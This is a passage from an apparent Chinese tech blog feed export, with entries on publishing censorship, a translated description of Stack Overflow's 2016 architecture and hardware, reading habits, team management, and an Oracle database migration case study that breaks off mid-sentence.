    <content type="text"><![CDATA[摘要 国内出版业 技术出版实践 出版自由 每一滴露水在太阳的照耀下都闪现着无穷无尽的色彩。但是精神的太阳，无论它照耀着多少个体，无论它照耀什么事物， 却只准产生一种色彩，就是官方的色彩！”——卡尔·马克思《评普鲁士最近的书报检查令》 Financial Times：中国将加强进口儿童文学作品管制监管部门已经给出版商发出口头指示，限制外国作者编写的儿童书籍数量，具体要求根据他们掌握的订单情况确定。这一决定将使每年出版的中文儿童作品译本，从数以千计减少到几百种。 工程师的自我修养：全英文技术学习实践 扩展阅读 数据可视化（十）公共数据源列表 参考文献 学术界的“盗版女王” 阮一峰：SOPA为什么是一部恶法，2012SOPA是《禁止网络盗版法案》（Stop Online Piracy Act）的缩写。该法案目前正在美国国会审议，引起了大量争议。 阮一峰：关于IT出版业，2010 阮一峰：中国畅销书真相，2008 阮一峰：关于中国图书出版业的一些想法，2007 阮一峰：版权的边界 @banggou:码农来说说计算机书籍的出版社以及购书途径分享 杨海玲：人民邮电出版社与图灵公司是什么关系？ 【司法大数据专题报告】著作权侵权案件量占知识产权侵权案件总量一半]]></content>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>最佳写作实践</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：Stack Overflow 架构全解析]]></title>
    <url>%2F2016%2F07%2F17%2FOpenSource-StackOverflow%2F</url>
    <content type="text"><![CDATA[摘要 Stack Overflow 架构解析，其架构既有商业外包服务，也大量采用开源软件，可以全景式展现当代主流架构的风貌。Stack Overflow 由 Jeff Atwood 和 Joel Spolsky 这两个非常著名的 Blogger 在 2008 年创建。 第一篇：总体架构第二篇：硬件清单第三篇：部署流程 (未翻译) As of April 2014, Stack Overflow has over 4,000,000 registered users[19]and more than 10,000,000 questions,[20]with 10,000,000 questions celebrated[21]in late August 2015. Based on the type oftagsassigned to questions, the top eight most discussed topics on the site are:Java,JavaScript,C#,PHP,Android,jQuery,PythonandHTML。——wiki 总体架构Stack Overflow 可以分解为八个切面：互联网、负载均衡、web层、服务层、缓存、推送、搜索、数据库。 First Rule:Everything is redundant两个数据中心：纽约和科罗拉多，冗余且持续备份。其它所有关键组件都尽可能贯彻冗余原则。 物理架构 4 台 Microsoft SQL Server 服务器（其中 2 台使用了新的硬件） 11 台 IIS Web 服务器（新的硬件） 2 台 Redis 服务器（新的硬件） 3 台标签引擎服务器（其中 2 台使用了新的硬件） 3 台 Elasticsearch 服务器（同上） 4 台 HAProxy 负载均衡服务器（添加了 2 台，用于支持 CloudFlare） 2 台网络设备（Nexus 5596 核心 + 2232TM Fabric Extender，升级到 10Gbps 带宽） 2 台 Fortinet 800C 防火墙（取代了 Cisco 5525-X ASAs） 2 台 Cisco ASR-1001 路由器（取代了 Cisco 3945 路由器） 2 台 Cisco ASR-1001-x 路由器 逻辑架构The Internets 互联网DNS服务：外包CloudFlare + 自建DNS其实外包DNS服务应该已经可以满足服务，不过出于保险起见，还是有一套自建的DNS Server。 看来trust issues 中外一致啊。 Load Balancers 负载均衡HAProxy 1.5.15 on CentOS 7支持TLS (SSL)流量。关注HAProxy 1.7,它即将支持HTTP/2。 引入开源架构之后，就必须持续关注、跟进社区的发展动态。 吃着碗里的，看着锅里的，永远不能停。 Web Tier Web层IIS 8.5, ASP.Net MVC 5.2.3, and .Net 4.6.1Service Tier 服务层IIS, ASP.Net MVC 5.2.3, .Net 4.6.1, and HTTP.SYSCache缓存RedisL1级别：HTTP 缓存 L2级别：L1级别缓存失败之后，通过Redis获取数据 L1&amp;L2都是无法命中的情况下，会从数据库查询，并更新到缓存和Redis。 缓存更新：基于发布／订阅模型，利用这个机制来清除其他服务上的 L1 缓存，用来保持 web 服务器上的缓存一致性。另外Redis实例的CPU都很低，不到2%，这点很惊人。 Push推送开源库：NetGrain使用 Websocket 向用户推送实时的更新内容，比如顶部栏中的通知、投票数、新导航数、新的答案和评论。在高峰时刻，大约有 50 万个并发的 Websocket 连接，这可是一大堆浏览器。 一个有趣的事实：其中一些浏览器已经打开超过 18 个月了。Someone should go check if those developers are still alive！！ 问题：临时端口、负载均衡上的文件句柄耗尽，都是非常有趣的问题，我们稍后会提到它们。 Search搜索Elasticsearch集群，每个ES集群都有3个Node什么不用Solr？我们需要在整个网络中进行搜索（同时有多个索引），在我们进行决策的时候 Solr 还不支持这种场景。 还没有使用 2.x 版本的原因，是因为2.x 版本中类型（types）有了很大的变化，这意味着想要升级的话我们得重新索引所有内容。 没有足够的时间来制定需求变更和迁移的计划。 Database数据库SQLServerOur usage of SQL is pretty simple. Simple is fast. 数据库中只有一个存储过程，而且我打算把这个最后残留的存储过程也干掉，换成代码。 监控系统Opserver：轻量级监控系统，基于 asp.net MVC 框架，可监控：Servers SQL clusters/instances redis elastic search exception logs haproxy 数据库CPU very low Stack Overflow: The Hardware - 2016 Edition这是关于Stack Overflow架构的一系列文章中的第二篇。前一篇：《 Stack Overflow: 架构》（2016版）后一篇：《 Stack Overflow: 我们是如何做部署的》（2016版） 有人对硬件感兴趣吗？好吧，我感兴趣，这篇博客就是关于这个话题，所以，我赢了。如果你不关系硬件，那么可以走开并关闭浏览器了。还在这儿吗？真棒。假如你的网页访问非常非常慢，在这种情况下，你应该考虑采购一些新的硬件。 我曾今反复重申过多次：性能是一个重要组件。特别是当你的代码必须在最快的硬件上运行，硬件的关系则越为重大。正如任何其它的平台，Stack Overflow的架构是分层的。硬件对我们来说属于基础层，它有自己的屋子，在很多情况下，对我们来说，它的许多关键组件是不可控的。。。就像运行在别人的服务器。它也伴随着直接和间接的成本。但是，这些不是本篇文章的重点，这方面的对比将于稍后报告。目前来说，我希望能提供一份详细的，关于我们基础设施的清单，用于大家参考和比较。 服务器照片。有时是裸设备。这个网页可以加载得更快，但是我不能自禁。（言归正传）在这个系列报告中我将提供大量数字和规格说明。当我说“我们的SQL Server CPU利用率接近5-10%，” 好吧，这非常棒。但是，5-10% 的什么？ 这时我们需要一个参考值。这份硬件清单可以回答这些问题，并且座位与其它平台比较的依据，利用率对比如何，容量对比如何，等等。 How We Do Hardware免责声明：我不是一个人干的。 George Beech (@GABeech) 是我的主要搭档，盘点管控Stack使用的硬件。我们小心地规范每一台服务器，以使它符合设计意图。 我们不会只管下订单、分派任务。在这个过程中我们也不会自己单独完成；你必须知道将来这些硬件需要运行什么东西，才能做出合适的选择。我们将和开发工程师或者其他的可靠性工程师一道，为运行在盒子上的应用选择最佳方案。我们也关注在整个系统中什么才是最好的。每一台服务器都不是孤岛。如何将它嵌入到总体的架构中去，确实需要好好考量。哪些服务可以全平台共享？数据中心？日志系统？管理更少的事情，或者至少做到更少的差异，这件事本身就具有内在的价值。 当我们盘点硬件的时候，我们列出了很多规则来帮助我们厘清哪些是需要提供的。我还从没有真正写下这些心里面的检查表，简短来说： 这是一个升级或降级的问题吗？（我们购买一个更大的机器，或者一些更小的？ 我们需要／希望做到什么程度的冗余? (多少预留空间和故障恢复能力?) 存储: 服务器／应用需要挂在磁盘吗？(我们是否需要Spinny操作系统驱动?) 如果是，需要多少？（多大的网络带宽？有多少小文件？是否需要固态硬盘？） 如果是SSD（固态硬盘），是否写负载？（我们讨论 Intel S3500/3700s? P360x? P3700s?) 我们需要多少SSD容量? (是否可以采用同时搭载HDD（机械硬盘）的双轮方案?) 数据是否需要完全缓存？（相比没有电容器的SSD，哪一种更便宜，哪种更合适？） 将来存储是否需要扩展? (我们采用1U/10-bay 服务器, 或者一个 2U/26-bay 服务器?) 这是一个数据仓库的场景设定吗？（我们是否考虑3.5’’驱动器？如果是，每个2U主板上是12个还是16个驱动器？） 对于3.5’’的后板来说，存储平衡在在处理器上是否能达到 120W TDP 的限制? 我们是否需要直接显示磁盘？（控制器是否需要支持pass-through?) 内存: 它需要多少内存？（我们必须买什么？） 它将会使用多少内存？（我们最好买什么？） 我们是否认为它稍后需要更多的内存？（我们应该搭配那种内存频率？） 它是一个内存消耗型应用程序吗？（我们是否想要达到最大主频？） 它是一个高并发的应用程序吗？（一定空间的情况下，我们是否想要通过更多的DIMM来分摊内存？） CPU: 我们希望采用哪种类型的处理器？（我们需要CPU自己供电还是独立电源？） 它是高并发的应用程序吗？（我们希望采用更少、更快的内核？或者，采用数量更多，更慢的内核？） 以下哪种情况？是否存在大量的二级和三级缓存竞争？（为了提高性能，我们是否需要一个巨大的三级缓存？） 应用瓶颈主要是单一内核吗？（我们是否采用最大主频？） 如果是这样的话，同时需要支持多少进程数？（这里我们希望采用哪种引擎？） 网络: 我们是否需要增加 10Gb 网络连接？（此处是否为透传设备，例如一个负载均衡器？） 我们需要怎样的出／入流量均衡策略？（哪个CPU内核负责计算均衡权重？） 冗余: 我们在数据缓存中心是否也需要服务器？ 我们是否需要在同等数量的情况下，接受更低的冗余要求？ 我们是否需要一个电源线？不。我们不需要。 现在，让我们来看看服务网站的都有哪些硬件，它们位于纽约 （New York）QTS 数据中心。实际上，它位于新泽西（New Jersey)，但是让我们保持这个约定。为什么我们称之为NY数据中心？因为我们不想重命名所有以NY-开头的服务器。（What ?!…）我将记录在下面的清单上，丹佛的情况，在规格和冗余级别上略有差别。 Hide Pictures (in case you’re using this as a hardware reference list later) Stack Overflow &amp; Stack Exchange 站点服务器纽约数据中心全局选项先说明一些全局配置，在下面每台服务器的介绍里就不重复了： 除非有特殊需要，不包含操作系统驱动。大多数服务器使用一对250 或者 500 GB SATA HDD 硬盘 ，用于操作系统，通常是 RAID 1。我们不担心启动时间问题，所有物理服务器，启动时间中的大部分不依赖驱动的速度（例如，检查768GB内存）。 所有服务器通过2个或以上10Gb网络链路连接，通过双活LACP协议。 所有服务器运行在208V 单相功率电源 (经由2个PSU ，来自2个PDU-双电源). 在纽约的所有服务器由缆线臂，在丹佛的服务器则没有（主要依靠本地工程师）。 所有服务器都有一个iDRAC连接 (经由管理网络) 和一个KVM连接。 网络 2x Cisco Nexus 5596UP 核心交换机 (96 SFP+ 端口，每个端口 10 Gbps) 10x Cisco Nexus 2232TM Fabric Extenders (2 per rack - each has 32 BASE-T ports each at 10Gbps + 8 SFP+ 10Gbps 上联链路) 2x Fortinet 800C 防火墙 2x Cisco ASR-1001 路由器 2x Cisco ASR-1001-x 路由器 6x Cisco 2960S-48TS-L 网管交换机 (1 Per Rack - 48 1Gbps ports + 4 SFP 1Gbps) 1x Dell DMPU4032 KVM 7x Dell DAV2216 KVM Aggregators (1–2 per rack - each uplinks to the DPMU4032) 原作者备注: 每个 FEX 到核心 拥有 80 Gbps 上联带宽 ，核心通过一个160 Gbps端口通道与它们连接。由于最近的一些工程，我们位于丹佛数据中心的硬件会更新一些。所有4 台路由器的型号是 ASR-1001-x 和 双核 Cisco Nexus 56128P,每个都拥有96 SFP+ 10Gbps 端口 和 8 QSFP+ 40Gbps 端口。这些节省下来的端口，可以用于未来扩展，我们可以为核心绑定4x 40Gbps链接，替代每个 16x10Gbps端口的方案，正如我们在纽约做的那样。这些就是纽约的网络设备情况: 丹佛数据中心这里需要提到的是Mark Henderson, 我们网站的可靠性工程师之一，专程到纽约数据中心为我的这份报告拿到了一些高分辨率的照片。 SQL Servers (Stack Overflow 集群) 2 Dell R720xd 服务器，每台配置如下: 双 E5-2697v2 处理器 (每个 12 核 @2.7–3.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 1x Intel P3608 4 TB NVMe PCIe SSD (RAID 0, 2块卡上两个控制器) 24x Intel 710 200 GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC)SQL Servers (Stack Exchange 及其它业务集群) 2 Dell R730xd Servers, each with: 双 E5-2667v3 处理器 (每个8 核 @3.2–3.6GHz) 768 GB of RAM (24x 32 GB DIMMs) 3x Intel P3700 2 TB NVMe PCIe SSD (RAID 0) 24x 10K Spinny 1.2 TB SATA HDDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC)原作者备注: 丹佛的SQL硬件在规格上相同，对应纽约部分这里只有一个 SQL 服务器这是二月份为纽约的SQL Server 升级PCIe SSD的情形： Web 服务器 11 Dell R630 服务器，每台配置如下: 双 E5-2690v3 处理器 (每个12 核 @2.6–3.5GHz) 64 GB of RAM (8x 8 GB DIMMs) 2x Intel 320 300GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) 应用服务器 (Workers) 2 Dell R630 服务器, 每台配置如下: 双 E5-2643 v3 处理器(每个 6 核 @3.4–3.7GHz) 64 GB of RAM (8x 8 GB DIMMs) 1 Dell R620 服务器,配置如下: 双 E5-2667 处理器 (每个6 核 @2.9–3.5GHz) 32 GB of RAM (8x 4 GB DIMMs) 2x Intel 320 300GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) 原作者备注: NY-SERVICE03 目前仍然是一台 R620, 但是现在并没有足够老到以至于需要更换。它会在今年晚些时候升级。 Redis 服务器 (缓存) 2 Dell R630 服务器, 每台配置如下: 双 E5-2687W v3 处理器 (每个10 核 @3.1–3.5GHz) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel 520 240GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) Elasticsearch 服务器 (检索) 3 Dell R620 服务器, 每台配置如下: 双 E5-2680 处理器 (每个8 核 @2.7–3.5GHz) 192 GB of RAM (12x 16 GB DIMMs) 2x Intel S3500 800GB SATA SSDs (RAID 1) 双 10 Gbps 网络 (Intel X540/I350 NDC) HAProxy 服务器 (负载均衡器) 2 Dell R620 服务器 (流量来源CloudFlare), 每台配置如下: 双 E5-2637 v2 处理器 (每个4 核 @3.5–3.8GHz) 192 GB of RAM (12x 16 GB DIMMs) 6x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志) 双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ)内网流量 双 10 Gbps 网络 (Intel X540) - 外网流量 2 Dell R620 服务器 (直达流量), 每台配置如下: 双 E5-2650 处理器 (每个 8 核 @2.0–2.8GHz each) 64 GB of RAM (4x 16 GB DIMMs) 2x Seagate Constellation 7200RPM 1TB SATA HDDs (RAID 10) (日志) 双 10 Gbps 网络 (Intel X540/I350 NDC) - (DMZ) 外网流量 双 10 Gbps 网络 (Intel X540) - 外网流量 原作者备注: 这些服务器是不同时期采购的，因此规格上略有差异。并且，2台CloudFlare负载均衡器因为安装了memcached,拥有更多内存（我们现在已经不运行该组件）。这些服务，redis, 检索,和负载均衡器在stack都是基于1U 服务器。这是纽约的情况： 其它服务器我们还有一些其他的服务器并不直接或间接服务于网站的流量。它们负责处理一些相关业务（例如，域名控制器，少量用于应用验证，跑在虚拟机上），或者一些次要的采购用于监控，日志存储，备份等等。既然已经表示未来会做一系列的报告，我把一切有趣的“后台”服务器也列出来。使我可以将更多的服务器拿出来和你分享，有人不喜欢的吗？ VM 服务器 (VMWare, 当前) 2 Dell FX2s Blade Chassis, each with 2 of 4 blades populated 4 Dell FC630 Blade Servers (2 per chassis), each with: 双 E5-2698 v3 处理器 (每个16 核 @2.3–3.6GHz) 768 GB of RAM (24x 32 GB DIMMs) 2x 16GB SD Cards (Hypervisor - no local storage) 双 4x 10 Gbps 网络 (FX IOAs - BASET) 1 EqualLogic PS6210X iSCSI SAN 24x Dell 10K RPM 1.2TB SAS HDDs (RAID10) 双 10Gb 网络 (10-BASET) 1 EqualLogic PS6110X iSCSI SAN 24x Dell 10K RPM 900GB SAS HDDs (RAID10) 双 10Gb 网络 (SFP+) 在一些场景下，还有几台重要的服务器不是虚拟机。这些系统后台任务，帮助我们通过日志追踪排查问题，存储大量的数据等等。 机器学习服务器 (Providence)这些服务器99%的时间是空闲的，但是每晚承担了大量的处理工作：刷新Providence。它们也可以通过内部数据中心的方式，用来测试基于海量数据的新算法。 2 Dell R620 服务器, 每台配置如下: 双 E5-2697 v2 处理器 (每个 12 核 @2.7–3.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 4x Intel 530 480GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) 译者注：Providence，应为项目代号。Providence通过分析流量日志，给网站的访问用户打标签 (类似“web开发者” 或者 “使用Java技术栈”) 。详细可以查阅[https://kevinmontrose.com/2015/01/27/providence-machine-learning-at-stack-exchange/] 机器学习服务器－Redis (Still Providence)这是一个为 Providence服务的redis数据集。它们通常是一台主用，一台备用，还有一个实例是用于测试，如最新版的ML算法。当它不用做Q&amp;A站点时，这些数据会服务于职位招聘的边栏广告。 3 Dell R720xd 服务器,每台配置如下: Dual E5-2650 v2 Processors (8 cores @2.6–3.4GHz each) 384 GB of RAM (24x 16 GB DIMMs) 4x Samsung 840 Pro 480 GB SATA SSDs (RAID 10) Dual 10 Gbps network (Intel X540/I350 NDC) 日志服务器(各种日志）我们的 Logstash 集群 (使用 Elasticsearch 存储) ，数据来源于，任何地方。我们曾计划将HTTP日志复制一份到这些服务器，但是由于影响性能的问题而没有实现。尽管如此，我们还是将所有的网络设备日志，syslog，Windows和Linux系统日志存在这里，所以我们能够建立建立一个网络的全局视图，或者快速地排查问题。当告警发生的时候，它也被用作Bosun的一个数据源。这个集群总计使用的存储是 6x12x4 = 288 TB。 6 Dell R720xd 服务器, 每台配置如下: Dual E5-2660 v2 Processors (10 cores @2.2–3.0GHz each) 192 GB of RAM (12x 16 GB DIMMs) 12x 7200 RPM Spinny 4 TB SATA HDDs (RAID 0 x3 - 4 drives per) 双 10 Gbps 网络 (Intel X540/I350 NDC) SQL Server－HTTP日志 在这些服务器，我们将访问负载均衡器的单独HTTP请求，存储到SQL数据库(来源于HAProxy syslog）。我们只记录少数高级别的请求，类似URL，查询，UserAgent,SQL执行时间，Redis，等等。在这里的数据，每天将进入一个集群的Columnstore 索引。我们借助这些数据排查用户的问题，发现僵尸网络，等等。 1 Dell R730xd 服务器，配置如下: 双 E5-2660 v3 处理器 (每个10 核 @2.6–3.3GHz) 256 GB of RAM (16x 16 GB DIMMs) 2x Intel P3600 2 TB NVMe PCIe SSD (RAID 0) 16x Seagate ST6000NM0024 7200RPM Spinny 6 TB SATA HDDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) SQL Server - 开发 我们喜欢尽可能多地模拟生产环境，类似SQL匹配，额，至少是它过去常常发生的那样。们一直以来这购买升级生产处理器。我们会将升级这些服务器，采用2U 解决方案，在今年晚些升级Stack Overflow 集群的时候一起做。 1 Dell R620 服务器，配置如下: 双 E5-2620 处理器 (每个6核 @2.0–2.5GHz) 384 GB of RAM (24x 16 GB DIMMs) 8x Intel S3700 800 GB SATA SSDs (RAID 10) 双 10 Gbps 网络 (Intel X540/I350 NDC) 这些就是实际服务我们网站的硬件，或者说大家普遍感兴趣的部分。我们当然还有其它服务器，用于后台任务，例如日志记录，监控，备份，等等。如果你对于我们其它系统还有特别感兴趣的地方，请尽管留言提问，我很高兴回答。 这是一周多以前在纽约的全程： 接下来？我做的这一系列工作是希望能让社区了解到最多情况。通过Trello board, 它让部署看起来像是下一个最有趣的话题。预计下一次将让大家了解代码是如何从开发者的机器到生产环境，以及这个过程中解决的所有问题。它将覆盖数据库迁移，滚动构建，CI 组件，我们如何建立开发环境，所有要素如何共享信息等。 参考文献 How Netflix works: the (hugely simplified) complex stuff that happens every time you hit Play]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于藏书与阅读]]></title>
    <url>%2F2016%2F07%2F03%2FReading%2F</url>
    <content type="text"><![CDATA[摘要 关于阅读方法 关于 Kindle 与电子出版 胡适：找书的快乐 关于阅读方法 案例：如何消化大部头专著 案例：2017年初制定的阅读计划 关于 Kindle 与电子出版 优势场景：飞机、高铁 劣势 Kindle 技巧1、Knotes:标记内容导出 （仅限于kindle）2、kindle for mac 标记内容导出 （未解决） 胡适：找书的快乐 我不是藏书家，只不过是一个爱读书，能够用书的书生。 藏书的之于书生：没有猴子的叫花子 我离开北平时，已经有一百箱的书，大约有一、二万册……收集了这么多的书，舍弃了太可惜，带吧，因为坐飞机又带不了。结果只带了一些笔记，并且在那一二万册书中，挑选了一部书，作为对一、二万册书的纪念，这一部书就是残本的《红楼梦》。四本只有十六回，这四本《红楼梦》可以说是世界上最老的抄本。收集了几十年的书，到末了只带了四本，等于当兵缴了械，我也变成了一个没有棍子，没有猴子的变把戏的叫花子。（1959年12月27日，（台湾）中国图书馆学会年会所作的演讲） 藏书的方法：无所不收 自己买书的时候，总是先买工具书，然后再买本行书，换一行时，就得另外买一种书。今年我六十九岁了，还不知道自己的本行到底是那一门？是中国哲学呢？还是中国思想史？抑或是中国文学史？或者是中国小说史？《水经注》？中国佛教思想史？中国禅宗史？我所说的“本行”，其实就是我的兴趣，兴趣愈多就愈不能不收书了。 做考据工作，没有书是很可怜的。考证《红楼梦》的时候，大家知道的材料很多，普通所看到的《红楼梦》都是一百二十回本。这种一百二十回本并非真的《红楼梦》。…… 民国十六年我从欧美回国，住在上海，有人写信告诉我，要卖一本《脂砚斋评石头记》给我，那时我以为自己的资料已经很多，未加理会。不久以后和徐志摩在上海办新月书店，那人又将书送来给我看，原来是甲戌年手抄再评本，虽然只有十六回，但却包含了许多重要史料。 根据我个人几十年来找书的经验，发现我们过去的藏书的范围是偏狭的，过去收书的目标集于收藏古董，小说之类决不在藏书之列。但我们必须了解了解，真正收书的态度，是要无所不收的。 推荐书单 2017年读书札记 | 原创 2018-01-21 阳志平 心智工具箱《读书法》作者桑兵说，放眼读书，前十年未必胜，中十年不会败，后十年无须战。我想说，用心交友，前十年一定少，中十年开始多，后十年知交满天下。与人为友，青春美丽，盛宴华筵，欢乐终有时；与书为友，安然静坐，促膝长谈，乐哉新相知。 2016年读书札记 | 原创 2017-01-04 阳志平 心智工具箱 参考文献 《如何阅读一本书》 人分为两类：一类是刺猬，他们对世界的认识依赖一到两个重大观点；一类是狐狸，他们认为世界太过复杂，无法归结为单一的口号。超级预言家毫无例外都来自“狐狸”的行列。]]></content>
  </entry>
  <entry>
    <title><![CDATA[eBook：The Road To Leader]]></title>
    <url>%2F2016%2F06%2F15%2FTeamWork%2F</url>
    <content type="text"><![CDATA[摘要 群体智慧 瘾品 项目管理工具 附录：一些不成熟的构思 团队重建中的心理问题 外科手术模式 交响乐队模式 群体智慧 保持群体智慧的唯一方式是保护每个人的独立性。–乔纳-莱勒（Jonah Lehrer） 群体会对特定类型的问题给出较好的答案。当大量的人做出回应时，他们产生了很多答案，但其平均值、中位数或最常见的回答往往会是一个很好的答案。这比人们被彼此隔离来发表独立意见更为可行。……但是，当人们看到别人提供的答案后，就出现了一些不好的事情。人们会修改自己的答案，从而造成最后的答案集合变得不够多样化，这样最好的答案就可能无法脱颖而出。人们通过强化会变得更加自信，但是精确度却没有改进。群体智慧依赖于多样性和独立性。在社交网络上（以及在企业、组织和政府机构工作的人员团队中），同事压力和主导人物可能会降低该团体的智慧。（《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏），P308） 人类认知与行为模式嗑药简史：关于瘾品，成瘾机制及其历史 什么是瘾？成瘾分类：物质成瘾、行为成瘾 药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草 行为成瘾：饮食、性行为、运动、暴力和战争 瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素） 瘾品的管制思路变迁：禁令还是放纵？ 《上瘾五百年: 烟、酒、咖啡和鸦片的历史》|戴维·考特莱特 综合了心理、药物、经济、文化、生态等领域的研究，详细介绍所有能让人类成瘾的物品，以及瘾品背后的经济、文化和战争。瘾品在历史上的力量有多大？它们为何有合法与违禁之分？是什么力量将瘾品的流行推动为规模庞大、模式各异的商品贸易？作者从瘾品的功能用途到它们的发现，到全球贸易的流通和经济政策，全面介绍精神瘾品的文化，追踪出大众化瘾品进入全球贸易主流的来龙去脉，内容有趣，视野广博，令人眼界大开。毫无疑问，它是一本关于瘾品文化史的经典著作，也是一本横跨世界史与药物史的杰作。 项目管理工具 Kanban 看板管理实践 基于Redmine的项目管理平台 Research Nature 论文|噬菌体之间的信息传递和群体决策 科学网论坛：你既然这样穷，为什么搞科研？ 参考文献 《火的礼物-人类与计算技术的终极博弈（第4版）》，Sara Baase（莎拉芭氏） 酷壳：让我们来谈谈分工 如何面试工程师 | Ammon Bartram 浅析在国内做不出好成果的原因 | 2015-11-16 鲍永利 科研圈 团队里的两类程序员]]></content>
      <tags>
        <tag>Manager</tag>
        <tag>最佳工程实践</tag>
        <tag>eBook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Oracle 数据库迁移与割接实践]]></title>
    <url>%2F2016%2F06%2F12%2FTechnology-Oracle%2F</url>
    <content type="text"><![CDATA[摘要 一、项目背景 二、主要困难 三、迁移前准备 四、失败的体验：没有一帆风顺 五、总结 一、项目背景某企业支撑系统，已经连续服务七年有余。算起来比我的工作年限还要长。 历年工程中，硬件、软件、运营团队都更新换了好几茬，单独系统核心数据库—— 一台小型机搭载Oracle 10g，附加一套磁盘阵列，从来没有动过。 随着近年的业务暴涨、负载上升、硬件老化，服务器、磁盘都时有故障发生，负载水平线逼近极限，故障率还有加速抬头的趋势。整个运营团队面临了巨大的客户压力，提升系统稳定性的巨大挑战摆在了大家面前。 二、主要困难 在“天塌地陷”的不利局面中加入进来。 2.1 困难1: 团队大动荡原运营团队，包括但不限于资深项目经理、技术负责人、多名工程师等，先后因各种原因，在很短的时间内集中离职了。在接手之前，对于该项目我一无所知，接手以后短暂的交接过程中，也很难获取多少有价值的信息。 连续发生突发重大故障，我们面临巨大的商务压力，团队内部疲惫不堪、心理压力极大、士气低落。每一次大故障，所有人都得没日没夜地处理，处理好以后还得写材料汇报，汇报之后也未必能得到客户的首肯。甚至在某种程度上说，急剧增长的故障率进一步刺激、增加了离职率。正如一位哲人说的： 降低故障率是提升团队幸福指数的首要保障。— 弗拉基米.耶维奇.严 2.2 困难2: 拓扑大调整系统的拓扑结构最初是星型：以数据库和应用服务器为核心，外挂近100台服务器。数据库服务器配置双网卡，连通内网、外网。 虽然星型结构简单易用，却也存在较大的安全隐患。在早期建设的时候，规范尚未健全，还可以用业务优先的理由搪塞过去。在本期工程中，非常明确必须要完成内外网分离的改造。 2.3 困难3: 安全一票否决Oracle 版本由10g 升级到 11g，集中管理访问权限。最大限度地提高安全性，口令60天更换一次，不能因为更换口令中断业务；如果出现连续的错误口令访问，甚至不惜锁定数据库。 从正向的角度看，这些严格规定可以倒逼改造。在软件架构规范化不足、自动化严重不足的条件下，整个迁移期间，这个问题确实给我们造成了极大困扰。 三、迁移前准备基于上述三大问题，在正式迁移之前主要做了下列几项工作： 3.1 加强监控手段，降低日常故障率； 梳理需要监控的基础指标和业务指标，侧重关键业务可用性。例如，某业务的正常调度周期是3小时，部署模拟脚本，将模拟脚本的调度频率提高到5分钟一次甚至更高，通过高密度的执行，主动触发风险点，一些隐藏的问题就比较容易暴露出来。 3.2 重点培训新人，稳定队伍； 本质上说，这次迁移工作的首要任务不在技术、也不在数据，而在于人。 上一个团队整体流失，新补充的人员又完全没有相关经验，可以说是从0开始。基于该阶段的特殊情况，我选择了实质性暂停迁移工作，而把主要的精力投入到人员培训和组织重建上来。 关于这块内容比较复杂，实际是另外一个主题，计划后续再发布，敬请关注。 3.3 梳理全局视图，调研周边系统关系链；全局视图实际上也包括技术和人两个维度： 1）重绘系统架构图：可以参考现有文档资料，但是主要应该立足于自主调研。绘制的过程，即是收集、整理的过程，也是制定迁移方案的思考过程。唯有自己动手，才能加深认识，做到胸有成竹。 2）大量接触相关方面的领导、配合部门以及第三方厂家： 个人工作经历方面，独立工作的场景居多，自己能直接控制的情况居多，不太需要理会复杂的部门关系、人际关系。这项工作对于某些人来说比较容易，但是对我而言，其实是有过一段比较困难的过程。 3.4 数据复制主要实现：OGG + dblink+ 自主迁移程序。 OGG：即Oracle Golden Gate方案。在最早的方案中，我们打算完全依赖OGG来实现数据复制，但是在实验阶段发现，该方案有其限制条件。第一、历史遗留系统有庞大的历史数据，如果都用OGG，无法确保新库的及时性、一致性。第二、由于管理的不规范，存在很多该做分区而没有做分区的大表，而且这样的表，数量很多，一时还真的很难分离出来。 DB Link: 提供了旧－&gt;新库之间的快速连接通道。 自主迁移程序：针对特殊大分区表。例如A表是大量的原始数据，每天一个分区，每个分区约为4000万条记录，一个月就有1.2亿条。由于业务上非常重要，该表的数据必须迁移到新库。针对这个问题，我们自己编写了迁移脚本。按照“少量、多批次、并行”的原则，实现数据推送。 首先，控制每个批次提交的记录数，将每个分区4000万的数据，切分成10万一份的小切片，这样即使失败也能快速重试，还能杜绝UNDO表空间暴涨（例如exp/imp整个分区的方式）。 基于小粒度的切片，进一步就可以实现多批次、多进程的并行推送，从而保证每个commit和时间单元的推送规模都完全可控、可视。 3.5 双库并行部署在所有采集服务器开启两个入库进程，即一份原始结果同时入两套数据库。最大限度在没有额外测试系统的条件下，利用现有资源，模拟仿真正式生产环境的并发压力，同时完成负载均衡、单点故障验证测试。 并不是所有的程序都能轻易的实现双库并行，有的可能只要稍微调整配置文件，有些可能就必须修改代码，还有的可能就没法弄。从这个角度观察，第一种应该就是好的代码，灵活，适应各种可能的场景。后者则可能连配置－代码分离都没有做到，侵入式编程等。 3.6 转发入库组件开发开发这个东西的时候，我一度准备中途放弃。前两版发布测试的时候，起初都还不错，但是运行一段时间之后，就暴露出严重的性能问题，几乎不可用。多次调试都找不到原因。后来发现，最大的Bug不过是一个空指针异常的捕获不合理。 很不经意地修改几个字符之后，一切都顺畅起来，往后再也没有出一丁点问题。 很多时候可能就是这样，需要一点灵性，需要一点运气。 3.7 割接工具开发系统配置收集器（例如口令配置必须保证强一致性）；转发路径监视（ 